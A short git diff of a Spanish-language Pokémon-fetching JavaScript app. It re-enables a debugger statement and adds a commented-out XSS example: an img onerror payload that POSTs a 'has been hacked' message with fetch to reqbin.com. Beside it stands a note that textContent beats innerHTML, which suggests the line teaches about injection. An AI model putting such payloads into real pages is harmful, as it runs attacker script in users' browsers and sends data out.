@@ -11,7 +11,7 @@ function catchPokemon() {
 
     document.getElementById("capturado").innerHTML = "Has capturado un: ";
     document.getElementById('pokemonImage').src = data.sprites.front_default;
-    /* debugger; */
+    debugger;
     document.getElementById('pokemonName').innerHTML = data.name;
     
     document.getElementById("id").innerHTML = "# " + data.id;
@@ -27,3 +27,5 @@ function randomPokemon(){
 
  //No poner innerHTML mejor textContent
 /* data.name.innerHTML = 'function pepe() {console.log("HAHAHA maligno???");console.log("¿Creeis que maligno entrará en nuestra web?")}; pepe()' */
+
+ // data.bug = `<img src='x' onerror='fetch("https://reqbin.com/echo/post/json", { method: "POST", body: JSON.stringify({userData: "HA HA HA, has been hacked", mode: "no-cors"}) })'>`
